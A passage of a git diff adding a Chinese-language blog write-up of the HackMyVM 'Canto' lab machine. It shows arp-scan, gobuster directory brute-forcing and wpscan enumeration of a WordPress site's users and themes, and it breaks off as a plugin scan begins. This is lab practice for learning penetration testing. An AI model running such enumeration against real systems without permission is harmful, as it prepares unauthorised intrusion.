@@ -10334,4 +10334,606 @@ reverse_engineer<span class="token punctuation">(</span><span class="token punct
         <tag>Re</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HackMyVM-Canto</title>
+    <url>/2024/06/05/HackMyVM-Canto/</url>
+    <content><![CDATA[<p><strong>难度:easy</strong></p>
+<p><strong>kali:192.168.56.104</strong></p>
+<p><strong>靶机:192.168.56.181</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># arp-scan -l</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.100  08:00:27:35:60:2d       PCS Systemtechnik GmbH
+<span class="token number">192.168</span>.56.181  08:00:27:d8:b5:f2       PCS Systemtechnik GmbH
+
+<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
+Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.968</span> seconds <span class="token punctuation">(</span><span class="token number">130.08</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
+
+
+
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># gobuster dir -u http://192.168.56.181 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.181
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/index.php            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/<span class="token punctuation">]</span>
+/wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-content/<span class="token punctuation">]</span>
+/wp-login.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">5169</span><span class="token punctuation">]</span>
+/license.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">19915</span><span class="token punctuation">]</span>
+/wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">322</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-includes/<span class="token punctuation">]</span>
+/readme.html          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7401</span><span class="token punctuation">]</span>
+/wp-trackback.php     <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">135</span><span class="token punctuation">]</span>
+/wp-admin             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">319</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-admin/<span class="token punctuation">]</span>
+/xmlrpc.php           <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">42</span><span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+/wp-signup.php        <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.181/wp-login.php?action<span class="token operator">=</span>register<span class="token punctuation">]</span>
+/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
+Progress: <span class="token number">984734</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">74.41</span>%<span class="token punctuation">)</span>^C
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
+Progress: <span class="token number">985328</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">74.46</span>%<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Finished
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
+<p>根据目录能看出是一个wordpress，那就围绕wp漏洞展开呗，用wpscan尝试收集一下信息</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>用wpscan跑了一下 用户名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># wpscan --url http://192.168.56.181 -e u --detection-mode aggressive --api-token ************************</span>
+
+_______________________________________________________________
+         __          _______   _____
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
+          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
+           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.56.181/ [192.168.56.181]
+[+] Started: Wed Jun  5 15:57:06 2024
+
+Interesting Finding(s):
+
+[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.56.181/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://192.168.56.181/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="6.5.3">WordPress&lt;/generator>
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://192.168.56.181/wp-admin/load-styles.php, Match: '</span><span class="token number">6.5</span>.3'
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Users <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>
+ Brute Forcing Author IDs - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">10</span> / <span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> erik
+ <span class="token operator">|</span> Found By: Wp Json Api <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://192.168.56.181/index.php/wp-json/wp/v2/users/?per_page<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token assign-left variable">page</span><span class="token operator">=</span><span class="token number">1</span>
+ <span class="token operator">|</span> Confirmed By:
+ <span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
+ <span class="token operator">|</span> Plan: <span class="token function">free</span>
+ <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">1</span>
+ <span class="token operator">|</span> Requests Remaining: <span class="token number">20</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">15</span>:57:10 <span class="token number">2024</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">54</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">6</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">14.67</span> KB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">241.517</span> KB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">104.543</span> MB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:03</code></pre>
+<p>拿到一个用户名erik<br>扫一下主题</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># wpscan --url http://192.168.56.181 -e t --detection-mode aggressive --api-token ************************</span>
+
+_______________________________________________________________
+         __          _______   _____
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
+          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
+           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.56.181/ [192.168.56.181]
+[+] Started: Wed Jun  5 15:58:05 2024
+
+Interesting Finding(s):
+
+[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.56.181/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://192.168.56.181/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="6.5.3">WordPress&lt;/generator>
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://192.168.56.181/wp-admin/load-styles.php, Match: '</span><span class="token number">6.5</span>.3'
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Most Popular Themes <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>
+ Checking Known Locations - Time: 00:00:04 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">400</span> / <span class="token number">400</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:04
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Theme Versions <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Theme<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> twentytwentyfour
+ <span class="token operator">|</span> Location: http://192.168.56.181/wp-content/themes/twentytwentyfour/
+ <span class="token operator">|</span> Latest Version: <span class="token number">1.1</span>
+ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-04-02T00:00:00.000Z
+ <span class="token operator">|</span> Readme: http://192.168.56.181/wp-content/themes/twentytwentyfour/readme.txt
+ <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Directory listing is enabled
+ <span class="token operator">|</span> Style URL: http://192.168.56.181/wp-content/themes/twentytwentyfour/style.css
+ <span class="token operator">|</span> Style Name: Twenty Twenty-Four
+ <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentyfour/
+ <span class="token operator">|</span> Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti<span class="token punctuation">..</span>.
+ <span class="token operator">|</span> Author: the WordPress team
+ <span class="token operator">|</span> Author URI: https://wordpress.org
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://192.168.56.181/wp-content/themes/twentytwentyfour/, status: <span class="token number">200</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> The version could not be determined.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> twentytwentythree
+ <span class="token operator">|</span> Location: http://192.168.56.181/wp-content/themes/twentytwentythree/
+ <span class="token operator">|</span> Latest Version: <span class="token number">1.4</span>
+ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-04-02T00:00:00.000Z
+ <span class="token operator">|</span> Readme: http://192.168.56.181/wp-content/themes/twentytwentythree/readme.txt
+ <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Directory listing is enabled
+ <span class="token operator">|</span> Style URL: http://192.168.56.181/wp-content/themes/twentytwentythree/style.css
+ <span class="token operator">|</span> Style Name: Twenty Twenty-Three
+ <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentythree
+ <span class="token operator">|</span> Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced <span class="token keyword">in</span> WordPress <span class="token number">6</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+ <span class="token operator">|</span> Author: the WordPress team
+ <span class="token operator">|</span> Author URI: https://wordpress.org
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://192.168.56.181/wp-content/themes/twentytwentythree/, status: <span class="token number">200</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> The version could not be determined.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> twentytwentytwo
+ <span class="token operator">|</span> Location: http://192.168.56.181/wp-content/themes/twentytwentytwo/
+ <span class="token operator">|</span> Latest Version: <span class="token number">1.7</span>
+ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-04-02T00:00:00.000Z
+ <span class="token operator">|</span> Readme: http://192.168.56.181/wp-content/themes/twentytwentytwo/readme.txt
+ <span class="token operator">|</span> Style URL: http://192.168.56.181/wp-content/themes/twentytwentytwo/style.css
+ <span class="token operator">|</span> Style Name: Twenty Twenty-Two
+ <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentytwo/
+ <span class="token operator">|</span> Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a<span class="token punctuation">..</span>.
+ <span class="token operator">|</span> Author: the WordPress team
+ <span class="token operator">|</span> Author URI: https://wordpress.org/
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://192.168.56.181/wp-content/themes/twentytwentytwo/, status: <span class="token number">200</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> The version could not be determined.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
+ <span class="token operator">|</span> Plan: <span class="token function">free</span>
+ <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">3</span>
+ <span class="token operator">|</span> Requests Remaining: <span class="token number">17</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">15</span>:58:22 <span class="token number">2024</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">419</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">38</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">112.38</span> KB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">75.975</span> KB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">168.949</span> MB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:16</code></pre>
+<p>没什么有用信息<br>扫一下插件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># wpscan --url http://192.168.56.181 -e p --detection-mode aggressive --api-token ************************</span>
+
+_______________________________________________________________
+         __          _______   _____
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
